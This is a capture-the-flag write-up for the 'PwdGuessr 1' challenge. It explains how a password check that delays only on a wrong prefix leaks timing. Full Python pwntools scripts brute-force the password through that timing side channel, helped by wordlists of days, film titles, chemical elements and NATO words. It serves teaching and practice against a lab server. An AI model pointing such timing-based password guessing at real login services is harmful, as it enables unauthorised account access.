# PwdGuessr 1

An interesting password guessing challenge

## Challenge Description

> To guess at things randomly is not to guess at all. Only through being methodical can enlightenment be achieved

**Note**: This challenge has a second part which is a trophy challenge.
You must be the first verified team to submit PwdGuessr2 to win the
trophy.

We have learned that the Demon-tron server has very particular requirements for
their users' passwords.

We have also managed to learn how those passwords are checked:

```python
def check_pwd(sample, pwd):
    for s, p in zip_longest(sample, pwd):
        if s is None or p is None:
            return False
        if p != s:
            time.sleep(0.5)  # Add a delay to stop password-guessing attacks
            return False
    return True
```

`nc $target_dns $target_port`

## Play Along at Home

During the CTF, the challenge was hosted at `pwdguessr.chal.cybears.io:2323`

To play after the CTF, run
```bash
docker run --name pwdguessr1 -dp 2323:2323 --rm registry.gitlab.com/cybears/fall-of-cybeartron/misc-pwdguessr
```
and then change the host in the scripts to `127.0.0.1`

## Walkthrough

### Initial Recon

From the definition of `check_pwd` given in the challenge description, it appears that when submitting a
password there are three possible outcomes:

1. Success - If we get the password entirely correct
2. Delayed Failure - If the attempted password **is not** a prefix of the real password, there will be a 500ms delay
3. Immediate Failure - If the attempted password **is** a prefix of the real password, it will return immediately

Connecting to the challenge with `nc pwdguessr.chal.cybears.io 2323` shows the prompt
```
Welcome, user 5909559.
Please enter your password: 
```
The initial welcome user with ID changes on each connection, this hints at something we discover later which
is that every connection the password changes.

Entering a random password lead to a brief pause, followed by the response
```
Sorry, that password was incorrect. Please enter your password: 
```
!!! note
    The response does not end with a newline, so `recvline` will not work while scripting this

### Bruteforce

To get a better idea of the passwords, a script was written to iteratively bruteforce character by character,
continuing whenever an attempted password does not cause a 500ms delay.

!!! note
    Script requires `pwntools` for providing a nice wrapper around the socket and `tqdm` for progress bars

After a bit of iterating on the script due to realizing a timeout occurred after a while, it looked like
```python
import string
from pwn import *
from tqdm import tqdm

alphabet = string.ascii_lowercase + string.digits + string.ascii_uppercase
host = "pwdguessr.chal.cybears.io"
port = 2323
r = remote(host, port)
user_line = r.recvline().decode()
user = user_line.split(" ")[-1][:-2]
r.recvuntil("Please enter your password: ")

class SuccessfulConnection(Exception):
    pass

class Timeout(Exception):
    pass

class NotFound(Exception):
    pass

def check(password):
    before = time.time()
    r.sendline(password)
    out = r.recv(5)
    if out != b"Sorry":
        if out == b"Conne":
            raise Timeout
        raise SuccessfulConnection(out.decode())
    after = time.time()
    r.recvuntil("Please enter your password: ")
    delta = after - before
    return delta < 0.5

def main(password: str = ""):
    log.setLevel("DEBUG")
    while True:
        for c in tqdm(alphabet):
            if check(password + c):
                password += c
                log.debug(f"password={password}")
                break
        else:
            raise NotFound(password)

if __name__ == '__main__':
    main()
```

Running this a couple of times, yielded a few prefixes before failing

- thurs
- sunda
- monda

### Wordlists

Due to the prefixes appearing to be days of the week, the script was adapted to try these first
```python
import string
from pwn import *
from tqdm import tqdm

alphabet = string.ascii_lowercase + string.digits + string.ascii_uppercase
host = "pwdguessr.chal.cybears.io"
port = 2323
r = remote(host, port)
user_line = r.recvline().decode()
user = user_line.split(" ")[-1][:-2]
r.recvuntil("Please enter your password: ")
days = ["monday", "tuesday", "wednesday", "thursday", "friday", "saturday", "sunday"]

class SuccessfulConnection(Exception):
    pass

class Timeout(Exception):
    pass

class NotFound(Exception):
    pass

def check(password: str):
    before = time.time()
    r.sendline(password)
    out = r.recv(5)
    if out != b"Sorry":
        if out == b"Conne":
            raise Timeout
        raise SuccessfulConnection(out.decode())
    after = time.time()
    r.recvuntil("Please enter your password: ")
    delta = after - before
    return delta < 0.5

def brute(password: str = ""):
    while True:
        for c in tqdm(alphabet):
            if check(password + c):
                password += c
                log.debug(f"password={password}")
                break
        else:
            raise NotFound(password)

def guess_days(password: str = ""):
    for day in days:
        test = password + day
        log.debug(f"Checking: {test}")
        if check(test):
            return test
    else:
        log.warn("Falling back to bruteforce")
        return brute(password)
            
def main():
    log.setLevel("DEBUG")
    password = guess_days()
    password = brute(password)
    
    
if __name__ == '__main__':
    main()
```
Running this discovered more of the prefix, specifically that the passwords began with a day
of the week followed by either `episode` or `harry`.

To accomodate the multiple wordlists, `guess_days` was refactored into a `guess_words` function
```python
# SNIP
def guess_words(words: List[str], password: str = "", fallback=True):
    for word in words:
        test = password + word
        log.debug(f"Checking: {test}")
        if check(test):
            log.debug(f"Found: {test}")
            return test
    else:
        if fallback:
            log.warn(f"Failed to use password from {words}")
            log.warn("Falling back to bruteforce")
            return brute(s)
        else:
            return None


def main():
    log.setLevel("DEBUG")
    password = guess_words(days)
    password = guess_words(["episode", "harry"])
    password = brute(password)
# SNIP
```

This revealed that the second segment of the password was either of the form `harrypotterandthe` (name of harry potter movie with no spaces)
or `episodeonetheph` (or any of the 9 Starwars movies)

Adapting the script
```python
def main():
    log.setLevel("DEBUG")
    password = guess_words(days)
    password = guess_words(["episode", "harrypotterandthe"])
    if password.endswith("episode"):
        s = guess_words(starwars_episodes, password)
    elif password.endswith("harrypotterandthe"):
        s = guess_words(potter_movies, password)
    password = brute(password)
```

!!! note
    I've skipped over a fair amount of trial and error while tweaking the wordlists to get the correct movie names

### Optimisation - Guess Prefixes

At this point, I decided to slightly optimize my guesses so that I could 

1. Simplify my wordlists
2. Reduce number of guesses prior to bruteforce, so I get more info before timing out

I noticed that when guessing from a wordlist, some words had common prefixes, which could be guessed independently.

```python
from collections import Counter

# SNIP

def guess_words_smart(words, password: str = ""):
    # Don't bother with divide and conquer for two passwords
    if len(words) <= 2:
        return guess_words(words, password)
    # Get most common first letters
    first_letters = Counter(word[0] for word in words).most_common()
    if first_letters[0][1] == 1:
        # If no common first letters just revert to guessing words
        return guess_words(words, password)
    # List of letters that have more than one word in list starting with them, ordered by 
    first_letters_s = [letter for letter, cnt in first_letters if cnt > 1]
    new_s = guess_words(first_letters_s, password)
    if new_s is None:
        new_words = [word for word in words if word[0] not in first_letters_s]
        assert len(new_words) > 0
        return guess_words_smart(new_words, password)
    words = [word[1:] for word in words if word[0] == new_s[-1]]
    return guess_words_smart(words, new_s)
```

With this optimisation, I could join the starwars episodes and harry potter movies wordlists without sacrificing performance.

```python
def main():
    log.setLevel("DEBUG")
    password = guess_words_smart(days)
    password = guess_words_smart(movies, password)
    brute(password)
```

### More Wordlists

With the optimisation out of the way, was able to bruteforce more of the next section of the password.

After a few prefixes were recovered, I recognised they were elements of the periodic table and added that as a wordlist
```python
def main():
    log.setLevel("DEBUG")
    password = guess_words_smart(days)
    password = guess_words_smart(movies, password)
    password = guess_words_smart(elements, password)
    brute(password)
```

!!! note
    What I did not realize at this point was that a few elements were spelled differently in the periodic table
    I used as a reference. This was uncovered during [PwdGuessr 2](pwdguessr2.md), but caused unexplained failure in ~4% of attempts.

### Even More Wordlists

Running the script a few more times revealed that the next (and last) part of the password were words from the Nato
phonetic alphabet. 

After adding the nato word list, running the script gave the file

### Full Source

#### pwdguessr.py

```python
from pwn import *
from tqdm import tqdm
from collections import Counter
from pwdguessrlists import (
    elements,
    days,
    nato_phonetic,
    movies,
)

# host = "pwdguessr.chal.cybears.io"
host = "127.0.0.1"
port = 2323
alphabet = string.ascii_lowercase
r = remote(host, port)
user_line = r.recvline().decode()
user = user_line.split(" ")[-1][:-2]
print(r.recvuntil("Please enter your password: "))


class SuccessfulConnection(Exception):
    pass


class NotFound(Exception):
    pass


class Timeout(Exception):
    pass


def check(x):
    before = time.time()
    r.sendline(x)
    out = r.recv(5)
    if out != b"Sorry":
        if out == b"Conne":
            raise Timeout
        raise SuccessfulConnection(out.decode())
    after = time.time()
    r.recvuntil("Please enter your password: ")
    delta = after - before
    return delta < 0.5


def brute(s: str = ""):
    while True:
        for c in tqdm(alphabet):
            if check(s + c):
                s += c
                print(f"s={s}")
                break
        else:
            raise NotFound("Brute")


def guess_words(words, s: str = "", fallback=True):
    for word in words:
        test = s + word
        log.debug(f"Checking: {test}")
        if check(test):
            return test
    else:
        if fallback:
            log.warn(f"Failed to use password from {words}")
            log.warn("Falling back to bruteforce")
            return brute(s)
        else:
            return None


def guess_words_smart(words, s: str = ""):
    # Napkin maths says 3 is a good number
    if len(words) < 3:
        return guess_words(words, s)
    first_letters = Counter(word[0] for word in words).most_common()
    if first_letters[0][1] == 1:
        return guess_words(words, s)
    first_letters_s = [letter for letter, cnt in first_letters if cnt > 1]
    new_s = guess_words(first_letters_s, s, fallback=False)
    if new_s is None:
        new_words = [word for word in words if word[0] not in first_letters_s]
        assert len(new_words) > 0
        return guess_words_smart(new_words, s)
    words = [word[1:] for word in words if word[0] == new_s[-1]]
    return guess_words_smart(words, new_s)


def main():
    log.setLevel("DEBUG")
    try:
        s = guess_words_smart(days)
        log.info(f"Partial: {s!r}")
        s = guess_words_smart(movies, s)
        log.info(f"Partial: {s!r}")
        s = guess_words_smart(elements, s)
        log.info(f"Partial: {s!r}")
        s = guess_words_smart(nato_phonetic, s)
        log.info(f"Partial: {s!r}")
        brute(s)
    except SuccessfulConnection as e:
        print("We're in!")
        out = r.recvall(0.1)
        msg = e.args[0] + out.decode()
        print(f"User: {user}")
        print(msg)
    finally:
        r.close()


if __name__ == "__main__":
    main()
```

#### pwdguessrlists.py

```python
days = ["monday", "tuesday", "wednesday", "thursday", "friday", "saturday", "sunday"]
movies = [
    "harrypotterandthechamberofsecrets",
    "harrypotterandthedeathlyhallowspartone",
    "harrypotterandthedeathlyhallowsparttwo",
    "harrypotterandthegobletoffire",
    "harrypotterandthegobletoffire",
    "harrypotterandthehalfbloodprince",
    "harrypotterandtheorderofthephoenix",
    "harrypotterandthephilosophersstone",
    "harrypotterandtheprisonerofazkaban",
    "harrypotterandtheprisonerofazkaban",
    "episodeeightthelastjedi",
    "episodefivetheempirestrikesback",
    "episodefouranewhope",
    "episodeninetheriseofskywalker",
    "episodeonethephantommenace",
    "episodeseventheforceawakens",
    "episodesixreturnofthejedi",
    "episodethreerevengeofthesith",
    "episodetwoattackoftheclones",
]
starwars_episodes = [
    "eightthelastjedi",
    "fivetheempirestrikesback",
    "fouranewhope",
    "ninetheriseofskywalker",
    "onethephantommenace",
    "seventheforceawakens",
    "sixreturnofthejedi",
    "threerevengeofthesith",
    "twoattackoftheclones",
]
potter_movies = [
    "chamberofsecrets",
    "deathlyhallowspartone",
    "deathlyhallowsparttwo",
    "gobletoffire",
    "halfbloodprince",
    "orderofthephoenix",
    "philosophersstone",
    "prisonerofazkaban",
]
elements = [
    "actinium",
    "aluminium",
    "aluminum",
    "americium",
    "antimony",
    "argon",
    "arsenic",
    "astatine",
    "barium",
    "berkelium",
    "beryllium",
    "bismuth",
    "bohrium",
    "boron",
    "bromine",
    "cadmium",
    "calcium",
    "californium",
    "carbon",
    "cerium",
    "caesium",
    "chlorine",
    "chromium",
    "cobalt",
    "copernicium",
    "copper",
    "curium",
    "darmstadtium",
    "dubnium",
    "dysprosium",
    "einsteinium",
    "erbium",
    "europium",
    "fermium",
    "flerovium",
    "fluorine",
    "francium",
    "gadolinium",
    "gallium",
    "germanium",
    "gold",
    "hafnium",
    "hassium",
    "helium",
    "holmium",
    "hydrogen",
    "indium",
    "iodine",
    "iridium",
    "iron",
    "krypton",
    "lanthanum",
    "lawrencium",
    "lead",
    "lithium",
    "livermorium",
    "lutetium",
    "magnesium",
    "manganese",
    "meitnerium",
    "mendelevium",
    "mercury",
    "molybdenum",
    "moscovium",
    "neodymium",
    "neon",
    "neptunium",
    "nickel",
    "nihonium",
    "niobium",
    "nitrogen",
    "nobelium",
    "oganesson",
    "osmium",
    "oxygen",
    "palladium",
    "phosphorus",
    "platinum",
    "plutonium",
    "polonium",
    "potassium",
    "praseodymium",
    "promethium",
    "protactinium",
    "radium",
    "radon",
    "rhenium",
    "rhodium",
    "roentgenium",
    "rubidium",
    "ruthenium",
    "rutherfordium",
    "samarium",
    "scandium",
    "seaborgium",
    "selenium",
    "silicon",
    "silver",
    "sodium",
    "strontium",
    "sulfur",
    "tantalum",
    "technetium",
    "tellurium",
    "tennessine",
    "terbium",
    "thallium",
    "thorium",
    "thulium",
    "tin",
    "titanium",
    "tungsten",
    "uranium",
    "vanadium",
    "wolfram",
    "xenon",
    "ytterbium",
    "yttrium",
    "zinc",
    "zirconium",
]
nato_phonetic = [
    "alfa",
    "bravo",
    "charlie",
    "delta",
    "echo",
    "foxtrot",
    "golf",
    "hotel",
    "india",
    "juliett",
    "kilo",
    "lima",
    "mike",
    "november",
    "oscar",
    "papa",
    "quebec",
    "romeo",
    "sierra",
    "tango",
    "uniform",
    "victor",
    "whiskey",
    "xray",
    "yankee",
    "zulu",
]
```
